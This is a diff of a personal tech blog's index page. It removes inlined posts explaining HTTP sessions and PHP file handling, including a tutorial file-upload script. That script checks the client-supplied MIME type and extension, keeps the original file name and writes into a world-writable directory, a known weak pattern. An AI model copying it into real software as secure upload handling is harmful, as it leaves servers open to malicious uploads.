-<h1 id="session"><a href="#session" class="headerlink" title="session"></a>session</h1><p>HTTP协议作为无状态协议，对于HTTP协议而言，无状体同样指每次request请求之前是独立的，当前请求并不会记录它上一次的请求信息。也就是说如果没有session的话，你登录淘宝，然后看完这一页，跳下一页的时候，又要重新进行身份认证，需要进行无数次http请求。于是，Web Server中引入了session的概念，用来保存客户端的状态信息。<br><img src="/2019/02/27/HTTP之COOKIE及SESSION/2.png" alt="2"></p>
-<h2 id="session的工作原理"><a href="#session的工作原理" class="headerlink" title="session的工作原理"></a>session的工作原理</h2><p>1）当一个用户向服务器发送第一个请求时，服务器为其建立一个session，并为此session创建一个标识号；</p>
-<p>2 ) 这个用户随后的所有请求都应包括这个标识号。服务器会校对这个标识号以判断请求属于哪个session。</p>
-<p>这种机制不使用IP作为标识，是因为很多机器是通过代理服务器方式上网，没法区分每一台机器。</p>
-<p>对于session标识号（sessionID），有两种方式实现：cookies和URL重写。</p>
-<p>然后用一个很形象的比喻来理解session</p>
-<p>假设Web Server是一个商场的存包处，<br>顾客(HTTP-request)，第一次来到存包处，管理员把顾客的物品存放在某一个柜子里面（这个柜子就相当于Session），然后把一个号码牌交给这个顾 客，作为取包凭证（这个号码牌就是Session ID）。顾客（HTTP Request）下一次来的时候，就要把号码牌（Session ID）交给存包处（Web Server）的管理员。管理员根据号码牌（Session ID）找到相应的柜子（Session），根据顾客（HTTP Request）的请求，Web Server可以取出、更换、添加柜子（Session）中的物品，Web Server也可以让顾客（HTTP Request）的号码牌和号码牌对应的柜子（Session）失效。顾客（HTTP Request）的忘性很大，管理员在顾客回去的时候（HTTP Response）都要重新提醒顾客记住自己的号码牌（Session ID）。这样，顾客（HTTP Request）下次来的时候，就又带着号码牌回来了。 </p>
-<h2 id="实现session的两种方式"><a href="#实现session的两种方式" class="headerlink" title="实现session的两种方式"></a>实现session的两种方式</h2><h3 id="1）URL重写。"><a href="#1）URL重写。" class="headerlink" title="1）URL重写。"></a>1）URL重写。</h3><p>Web Server在返回Response的时候，检查页面中所有的URL，包括所有的连接，和HTML Form的Action属性，在这些URL后面加上“;jsessionid=XXX”。<br>下一次，用户访问这个页面中的URL。jsessionid就会传回到Web Server。</p>
-<h3 id="2）Cookie。"><a href="#2）Cookie。" class="headerlink" title="2）Cookie。"></a>2）Cookie。</h3><p>如果客户端支持Cookie，Web Server在返回Response的时候，在Response的Header部分，加入一个“set-cookie: jsessionid=XXXX”header属性，把jsessionid放在Cookie里传到客户端。 </p>
-<p>客户端会把Cookie存放在本地文件里，下一次访问Web Server的时候，再把Cookie的信息放到HTTP Request的“Cookie”header属性里面，这样jsessionid就随着HTTP Request返回给Web Server。</p>
-<p>总结：Cookie通过在客户端记录信息确定用户身份，Session通过在服务器端记录信息确定用户身份</p>
-<p>参考：<br><a href="https://www.cnblogs.com/bq-med/p/8603664.html" target="_blank" rel="noopener">https://www.cnblogs.com/bq-med/p/8603664.html</a><br><a href="https://www.cnblogs.com/lyy-5518/p/5460994.html" target="_blank" rel="noopener">https://www.cnblogs.com/lyy-5518/p/5460994.html</a></p>
-
+            <p>
+              
+              ...
+            </p>
+          <!--noindex-->
           
+            <div class="post-button text-center">
+              <a class="btn" href="/2019/02/27/HTTP之COOKIE及SESSION/#more" rel="contents">
+                Weiterlesen &raquo;
+              </a>
+            </div>
+          
+          <!--/noindex-->
         
       
     </div>
@@ -1728,7 +1764,7 @@
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="cookie">
       <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="image" content="/images/name.png">
     </span>
 
     <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
@@ -1824,210 +1860,19 @@
       
         
           
-            <h1 id="PHP文件处理"><a href="#PHP文件处理" class="headerlink" title="PHP文件处理"></a>PHP文件处理</h1><h2 id="打开文件"><a href="#打开文件" class="headerlink" title="打开文件"></a>打开文件</h2><p>fopen()函数在于在PHP中打开文件。<br>此函数的第一个参数含有要打开的文件的名称，第二个参数规定了使用哪种模式来打开文件：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file=fopen(<span class="string">"welcome.txt"</span>,<span class="string">"r"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
-<p><img src="/2019/02/27/php之文件以及文件上传/1.png" alt="1"><br>如果fopen()函数不能打开指定的文件，下面的实例会生成一点消息<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file=fopen(<span class="string">"welcome.txt"</span>,<span class="string">"r"</span>) <span class="keyword">or</span> <span class="keyword">exit</span>(<span class="string">"Unable to open file!"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
-<p>我觉得这段消息，就相当于抛出异常。</p>
-<h2 id="关闭文件"><a href="#关闭文件" class="headerlink" title="关闭文件"></a>关闭文件</h2><p>fclose() 函数用于关闭打开的文件：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> $file = fopen(<span class="string">"text.txt"</span>,<span class="string">"r"</span>);</span><br><span class="line">  fclose($file);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<h2 id="检测文件末尾（EOF）"><a href="#检测文件末尾（EOF）" class="headerlink" title="检测文件末尾（EOF）"></a>检测文件末尾（EOF）</h2><p>feof() 函数检测是否已到达文件末尾（EOF）。</p>
-<p>在循环遍历未知长度的数据时，feof() 函数很有用。</p>
-<p>注释：在 w 、a 和 x 模式下，您无法读取打开的文件！，因为我们需要可读这个文件，才能进行判断是否到达文件末尾。<br>    <code>if (feof($file)) echo &quot;文件结尾&quot;;</code><br>此时说明到达文件末尾的时候，输出”文件结尾”</p>
-<h2 id="逐字符读取文件"><a href="#逐字符读取文件" class="headerlink" title="逐字符读取文件"></a>逐字符读取文件</h2><p>fgetc() 函数用于从文件中逐字符地读取文件。</p>
-<p>注释：在调用该函数之后，文件指针会移动到下一个字符。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file=fopen(<span class="string">"welcome.txt"</span>,<span class="string">"r"</span>) <span class="keyword">or</span> <span class="keyword">exit</span>(<span class="string">"无法打开文件!"</span>);</span><br><span class="line"><span class="keyword">while</span> (!feof($file))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> fgetc($file);</span><br><span class="line">&#125;</span><br><span class="line">fclose($file);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p><a href="http://www.runoob.com/php/php-ref-filesystem.html" target="_blank" rel="noopener">PHP5-filesystem函数手册</a></p>
-<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><p>这里使用菜鸟教程里的一个简单的服务器文件<br>先放上一个文件上传脚本<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 允许上传的图片后缀</span></span><br><span class="line">$allowedExts = <span class="keyword">array</span>(<span class="string">"gif"</span>, <span class="string">"jpeg"</span>, <span class="string">"jpg"</span>, <span class="string">"png"</span>);</span><br><span class="line">$temp = explode(<span class="string">"."</span>, $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]);</span><br><span class="line"><span class="keyword">echo</span> $_FILES[<span class="string">"file"</span>][<span class="string">"size"</span>];</span><br><span class="line">$extension = end($temp);     <span class="comment">// 获取文件后缀名</span></span><br><span class="line"><span class="keyword">if</span> ((($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/gif"</span>)</span><br><span class="line">|| ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/jpeg"</span>)</span><br><span class="line">|| ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/jpg"</span>)</span><br><span class="line">|| ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/pjpeg"</span>)</span><br><span class="line">|| ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/x-png"</span>)</span><br><span class="line">|| ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/png"</span>))</span><br><span class="line">&amp;&amp; ($_FILES[<span class="string">"file"</span>][<span class="string">"size"</span>] &lt; <span class="number">204800</span>)   <span class="comment">// 小于 200 kb </span></span><br><span class="line">&amp;&amp; in_array($extension, $allowedExts))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> ($_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] &gt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"错误：: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"上传文件名: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>] . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"文件类型: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"文件大小: "</span> . ($_FILES[<span class="string">"file"</span>][<span class="string">"size"</span>] / <span class="number">1024</span>) . <span class="string">" kB&lt;br&gt;"</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"文件临时存储的位置: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>] . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">		</span><br><span class="line">		<span class="comment">// 判断当期目录下的 upload 目录是否存在该文件</span></span><br><span class="line">		<span class="comment">// 如果没有 upload 目录，你需要创建它，upload 目录权限为 777</span></span><br><span class="line">		<span class="keyword">if</span> (file_exists(<span class="string">"upload/"</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">echo</span> $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>] . <span class="string">" 文件已经存在。 "</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">// 如果 upload 目录不存在该文件则将文件上传到 upload 目录下</span></span><br><span class="line">			move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>], <span class="string">"upload/"</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]);</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"文件存储在: "</span> . <span class="string">"upload/"</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"非法的文件格式"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>现在我们分段分析一下这串代码</p>
-<p>前期有一个文件上传表单<br>允许用户从表单上传文件是非常有用的。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">&lt;title&gt;菜鸟教程(runoob.com)&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">"upload_file.php"</span> method=<span class="string">"post"</span> enctype=<span class="string">"multipart/form-data"</span>&gt;</span><br><span class="line">    &lt;label <span class="keyword">for</span>=<span class="string">"file"</span>&gt;文件名：&lt;/label&gt;</span><br><span class="line">    &lt;input type=<span class="string">"file"</span> name=<span class="string">"file"</span> id=<span class="string">"file"</span>&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type=<span class="string">"submit"</span> name=<span class="string">"submit"</span> value=<span class="string">"提交"</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
-<h2 id="然后创建上传脚本"><a href="#然后创建上传脚本" class="headerlink" title="然后创建上传脚本"></a>然后创建上传脚本</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"错误："</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"上传文件名: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>] . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"文件类型: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"文件大小: "</span> . ($_FILES[<span class="string">"file"</span>][<span class="string">"size"</span>] / <span class="number">1024</span>) . <span class="string">" kB&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"文件临时存储的位置: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>在这里使用到PHP的全局变量$_FILES,然后这里补充一下这个全局变量的知识。<br>通过使用 PHP 的全局数组 $_FILES，你可以从客户计算机向远程服务器上传文件。</p>
-<p>第一个参数是表单的 input name，第二个下标可以是 “name”、”type”、”size”、”tmp_name” 或 “error”。如下所示：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>] - 上传文件的名称</span><br><span class="line">$_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] - 上传文件的类型</span><br><span class="line">$_FILES[<span class="string">"file"</span>][<span class="string">"size"</span>] - 上传文件的大小，以字节计</span><br><span class="line">$_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>] - 存储在服务器的文件的临时副本的名称</span><br><span class="line">$_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] - 由文件上传导致的错误代码</span><br></pre></td></tr></table></figure></p>
-<p>然后我个人觉得这几个东西要熟记</p>
-<h2 id="由于出于安全考虑，所以我们就需要进行上传限制的处理"><a href="#由于出于安全考虑，所以我们就需要进行上传限制的处理" class="headerlink" title="由于出于安全考虑，所以我们就需要进行上传限制的处理"></a>由于出于安全考虑，所以我们就需要进行上传限制的处理</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 允许上传的图片后缀</span></span><br><span class="line">$allowedExts = <span class="keyword">array</span>(<span class="string">"gif"</span>, <span class="string">"jpeg"</span>, <span class="string">"jpg"</span>, <span class="string">"png"</span>);</span><br><span class="line">$temp = explode(<span class="string">"."</span>, $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]);</span><br><span class="line">$extension = end($temp);        <span class="comment">// 获取文件后缀名</span></span><br><span class="line"><span class="keyword">if</span> ((($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/gif"</span>)</span><br><span class="line">|| ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/jpeg"</span>)</span><br><span class="line">|| ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/jpg"</span>)</span><br><span class="line">|| ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/pjpeg"</span>)</span><br><span class="line">|| ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/x-png"</span>)</span><br><span class="line">|| ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/png"</span>))</span><br><span class="line">&amp;&amp; ($_FILES[<span class="string">"file"</span>][<span class="string">"size"</span>] &lt; <span class="number">204800</span>)    <span class="comment">// 小于 200 kb</span></span><br><span class="line">&amp;&amp; in_array($extension, $allowedExts))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ($_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"错误：: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"上传文件名: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>] . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"文件类型: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"文件大小: "</span> . ($_FILES[<span class="string">"file"</span>][<span class="string">"size"</span>] / <span class="number">1024</span>) . <span class="string">" kB&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"文件临时存储的位置: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"非法的文件格式"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>这里我发现了两个点就是过滤，一个点是他对后缀名的过滤，一点是他的文件类型的过滤</p>
-<h2 id="保存被上传的文件"><a href="#保存被上传的文件" class="headerlink" title="保存被上传的文件"></a>保存被上传的文件</h2><p>上面的例子在服务器的 PHP 临时文件夹创建了一个被上传文件的临时副本</p>
-<p>这个临时的复制文件会在脚本结束时消失。要保存被上传的文件，我们需要把它拷贝到另外的位置：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 允许上传的图片后缀</span></span><br><span class="line">$allowedExts = <span class="keyword">array</span>(<span class="string">"gif"</span>, <span class="string">"jpeg"</span>, <span class="string">"jpg"</span>, <span class="string">"png"</span>);</span><br><span class="line">$temp = explode(<span class="string">"."</span>, $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]);</span><br><span class="line"><span class="keyword">echo</span> $_FILES[<span class="string">"file"</span>][<span class="string">"size"</span>];</span><br><span class="line">$extension = end($temp);     <span class="comment">// 获取文件后缀名</span></span><br><span class="line"><span class="keyword">if</span> ((($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/gif"</span>)</span><br><span class="line">|| ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/jpeg"</span>)</span><br><span class="line">|| ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/jpg"</span>)</span><br><span class="line">|| ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/pjpeg"</span>)</span><br><span class="line">|| ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/x-png"</span>)</span><br><span class="line">|| ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/png"</span>))</span><br><span class="line">&amp;&amp; ($_FILES[<span class="string">"file"</span>][<span class="string">"size"</span>] &lt; <span class="number">204800</span>)   <span class="comment">// 小于 200 kb</span></span><br><span class="line">&amp;&amp; in_array($extension, $allowedExts))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ($_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"错误：: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"上传文件名: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>] . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"文件类型: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"文件大小: "</span> . ($_FILES[<span class="string">"file"</span>][<span class="string">"size"</span>] / <span class="number">1024</span>) . <span class="string">" kB&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"文件临时存储的位置: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>] . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 判断当期目录下的 upload 目录是否存在该文件</span></span><br><span class="line">        <span class="comment">// 如果没有 upload 目录，你需要创建它，upload 目录权限为 777</span></span><br><span class="line">        <span class="keyword">if</span> (file_exists(<span class="string">"upload/"</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>] . <span class="string">" 文件已经存在。 "</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 如果 upload 目录不存在该文件则将文件上传到 upload 目录下</span></span><br><span class="line">            move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>], <span class="string">"upload/"</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"文件存储在: "</span> . <span class="string">"upload/"</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"非法的文件格式"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>代码都看懂了，感觉最重要的还是那个$_FILES这个全局变量</p>
-
-          
-        
-      
-    </div>
-
-    
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/02/27/PHP之cookie及session/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="cookie">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="The clown is laughing at you">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2019/02/27/PHP之cookie及session/" class="post-title-link" itemprop="url">PHP之cookie-session</a>
+            <p>
               
-            
-          </h1>
-        
-
-        <div class="post-meta">
-
+              ...
+            </p>
+          <!--noindex-->
           
+            <div class="post-button text-center">
+              <a class="btn" href="/2019/02/27/php之文件以及文件上传/#more" rel="contents">
+                Weiterlesen &raquo;
+              </a>
+            </div>
           
-          
-
-          
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Veröffentlicht am</span>
-              
-
-              
-                
-              
-
